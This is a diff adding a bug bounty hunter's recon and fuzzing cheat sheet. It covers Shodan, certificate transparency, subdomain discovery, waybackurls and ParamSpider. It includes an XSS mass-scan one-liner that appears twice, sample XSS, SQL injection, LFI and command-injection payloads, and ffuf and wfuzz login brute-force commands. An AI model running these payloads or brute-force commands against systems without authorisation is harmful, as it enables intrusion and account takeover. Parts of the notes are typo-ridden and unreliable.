@@ -1,0 +1,224 @@
+Top 10 rules:
+
+* Choose the right bug bounty program.
+* Recon, Donont DDOS with active scans and automated scanners
+* Do not expect rewards.
+* Develop your flow of approach and methodology.
+* Surround yourself with the Bug Bounty Community to keep yourself updated.
+* Automatic Everything
+* Make your own checklist.
+* When you find a bug chain,
+* Increase the severity; impact matters.
+* Mental health is important. Take a break and do something leisurely.
+
+What is Web:
+
+Websites: Collections of web pages are called websites. Websites are built with lots of web pages, and the main web page of the website is called the home page.
+Web browser: It is software programs that allow a user to locate, access, and display web pages of websites.
+
+Shodan:
+For Linux : pip install shodan 
+Online : https://www.shodan.io/
+alternative : https://hunter.io/
+
+for setting api : shodan init <key>
+
+shodan info
+shodan version
+shodan count openssh
+shodan count bigip
+shodan download bigipfile bigip
+shodan host <ip>
+shodan myip
+shodan parse -h
+shodan search -h
+shodan search ssh
+shodan scan -h
+shodan scan submit <ip>
+shodan scan submit <ip range> [go to https://bgp.he.net/ search by company name and find their ip range] 
+shodan stats ftp
+shodan domain <site> 
+
+Shodan Live Hunting:
+Directory Listing, Username and passwords, Internal ENdpoints, Private Ips, Source Code Disclose, API keys
+
+For Linux : https://github.com/TryGhost/Ghost
+https://github.com/EntySec/Ghost
+
+git clone https://github.com/EntySec/Ghost.git
+ls && cd Ghost && chmod +x setup.py
+./setup.py install 
+sudo ghost
+
+Certificate Transparency :
+
+Under Cerrtificate Transparency(CT) a certificate authority(CA) will have to publish all SSL/TLS certificate they issue in a public log. AnyOne can look thruogh the CT logs and find certificates issured for a domain
+
+Link : https://crt.sh/
+For Direct Request : https://crt.sh/?q=
+
+crt.sh github link : https://gist.github.com/1N3/dec432d14fec84e09733f39669ebca0f
+bash crt.sh <domain>
+
+Github Link : https://github.com/SmoZy92/Shodomain
+python shodomain.py API-KEY example.com
+
+Link : https://search.censys.io/ create an account and gathering API_SECRET and API_ID 
+Github Link : https://github.com/gelim/censys
+
+Link : https://developers.facebook.com/tools/ct/search/
+Link : https://transparencyreport.google.com/https/overview
+
+Scope Expansion:
+
+https://hackertarget.com/find-dns-host-records/
+https://pentest-tools.com/information-gathering/find-subdomains-of-domain
+https://osint.sh/subdomain/
+https://seranking.com/free-tools/subdomain-finder.html
+https://crt.sh/
+https://www.virustotal.com/gui/home/upload
+https://phishtank.com/
+
+https://github.com/aboul3la/Sublist3r
+
+git clone https://github.com/aboul3la/Sublist3r
+sudo pip install -r requirements.txt
+
+sublist3r -d <example.com>
+sublist3r -d <example.com> | tee name.txt
+sublist3r -d <example.com> -b -v -e google,virustotal
+sublist3r -d <example.com> -b -v -e google,virustotal -t 20
+
+Finding All Subdomains : https://chaos.projectdiscovery.io/#/
+github link : https://github.com/jonathf/chaospy
+
+python3 chaospy.py -l
+python3 chaospy.py -bc
+python3 chaospy.py -h1
+python3 chaospy.py -dbc
+python3 chaospy.py -dh1
+python3 chaospy.py -d <programme name>
+
+Site : https://www.nmmapper.com/
+
+Wayback Machine : https://web.archive.org/
+Dork : */hackerone.com/*
+
+echo "abc.com" | sudo waybackurls | tee urls.txt
+cat domain.txt | sudo waybackurls | tee urls.txt
+
+waybackurls hackerone.com | grep "embedded_submissions/new$" | sort -u
+
+echo "https://web.archive.org/cdx/search/cdx?url=*.hackerone.com&fl=original&collapse=urlkey" | grep embedded_submissions/new
+
+sudo waybackurls testphp.vulnweb.com | tee name.txt | sudo qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+ParamSpider : https://github.com/devanshbatham/ParamSpider
+
+paramspider.py --domain <link> --output name.txt
+paramspider.py --domain <link> --output name.txt --level high
+paramspider.py --domain <link> --output name.txt --level high --exclude woff,css,js,png,php,jpg
+
+paramspider.py -d <link> | tee yy.json | sudo qsreplace '"><script>confirm(1)</script> | while read host do ; do curl --silent --path-as-is --insecure "$host" grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+wrtieup link : https://www.pethuraj.com/blog/google-bug-bounty-writeup/
+
+python3 paramspider.py -d <link> --placeholder fuzzz
+python3 paramspider.py -d <link> --subs false > name.txt
+
+gau apple.com -subs -o applesubs.txt
+
+Domain Info:
+DNS Dumpster : https://dnsdumpster.com/
+ViewDNS : https://viewdns.info/
+Robtex : https://www.robtex.com/
+Domain Digger : https://digger.tools/
+IpDB : https://ipdb.me/
+
+CMS Info:
+Wappalyzer, Builtwith, Whatweb, Neetcraft, retire.js, 
+
+What Web : https://github.com/urbanadventurer/WhatWeb
+https://www.whatweb.net/
+Netcraft : https://sitereport.netcraft.com/
+
+Fuzzing:
+
+* To increase the scope
+* GET CVES
+* Play smart, make your hunting process make easy and effective
+* Find what others are missing
+* Find What others are missing in hidden points
+* Find Default configured servers
+* Find Hardcore tokens, api-keys, base64 encoded cred
+* Do better than others
+
+Attacker : www.abc.com/FUZZ
+XSS : "><img src=x onerror=confrim(1)>
+SQLI : admin' or '1'='1
+LFI : /etc/passwd
+Code objection : whoami
+Sensitive Data : /users
+
+Injection Point : Find Endpoints to give Input, Check for parameter, Check for Headers
+Payload WordList : CMS Based Wordlists, Common/Long name Wordlists, Special Character Wordlists
+Fuzzing : Manual, Automation, wayback
+
+Wordlist:
+
+https://github.com/danielmiessler/SecLists
+https://github.com/fuzzdb-project/fuzzdb
+https://github.com/swisskyrepo/PayloadsAllTheThings
+Jhaddix All.txt - https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a
+Jhaddix Content Discovery - https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10
+dicc.txt - https://github.com/rvrsh3ll/dirs3arch/blob/master/db/dicc.txt
+
+ffuf -w wordlist.txt -u http://website.com/FUZZ -e .aspx,.html,.php,.txt,.conf,.bak
+ffuf -u "https://bugbountytarget.com/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -fc 301
+ffuf -u "https://bugbountytarget.com/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 301
+Command - ffuf -u http://192.168.0.105/FUZZ -w wordlist.txt
+
+username=HFUZZ&password=WFUZZ&submit=Submit
+ffuf -request reqffuf.txt -request-proto https -mode clusterbomb -w users.txt:HFUZZ -w users.txt:WFUZZ  -c  -mc all -fl 7
+
+* If you are finding any IP or any website, first use Dirsearch to find hidden directories. You will find it by not only burp but also ffuf. 
+burp: intercept with burp and find the path to the header. If you do not find any path, type any value, go to intruder,target to the injection point select attack type and wordlist, and start the attack.
+
+Wordlist : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt
+Wordlist : https://raw.githubusercontent.com/maurosoria/dirsearch/master/db/dicc.txt
+
+Some wordlist : https://github.com/maurosoria/dirsearch/tree/master/db
+
+
+https://github.com/fuzzdb-project/fuzzdb
+
+wfuzz -c -w /SecLists/Fuzzing/LFI/dicc.txt http://abc.xyz/FUZZ
+wfuzz -c -hc 400,404 -w /SecLists/Fuzzing/LFI/dicc.txt http://abc.xyz/FUZZ
+wfuzz -c -z file,users.txt --hs "Try Harder" -d "username=FUZZ&password=FUZZ" http://abc.xyz/index.php
+wfuzz -z file,users.txt -c hc 401 --basic FUZZ:FUZZ <ip>
+
+
+wfuzz -c -z top-usernames-shortlist.txt --hs incorrect -d "username=FUZZ&password=FUZZ" http://192.168.0.1/
+wfuzz -c -w /root/Desktop/worlist.txt --hc invalid -d "login=FUZZ&pwd=FUZZ" -u http://192.168.0.1/wp-login.php
+wfuzz -w /root/Desktop/worlist.txt --hc 403,404 -u http://192.168.0.1/wp-login.php
+wfuzz -w /root/Desktop/worlist.txt --hc 403,404 -u http://192.168.0.1/FUZZ
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
